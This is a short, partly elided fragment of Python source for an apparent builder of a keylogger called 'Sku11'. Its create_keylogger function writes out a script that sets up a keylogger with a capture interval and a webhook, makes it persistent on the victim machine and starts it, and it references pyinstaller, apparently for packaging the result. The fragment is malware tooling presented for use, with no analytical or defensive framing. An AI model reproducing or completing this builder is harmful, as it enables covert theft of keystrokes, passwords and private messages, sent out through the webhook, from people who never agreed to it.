...
WINDOWS_PYTHON_INTERPRETER_PATH = os.path.expanduser("/usr/bin/pyinstaller")
def get_arguments():
    parser = argparse.ArgumentParser(description='The Sku11 Is Back')
...
def create_keylogger(file_name, interval, webhook):
    with open(file_name, "w+") as file:
        ...
        file.write("Sku11 = keylogger.Kl(" + interval + ", '" + webhook + "')\n")
        file.write("Sku11.become_persistent()\n")
        file.write("Sku11.start()\n")
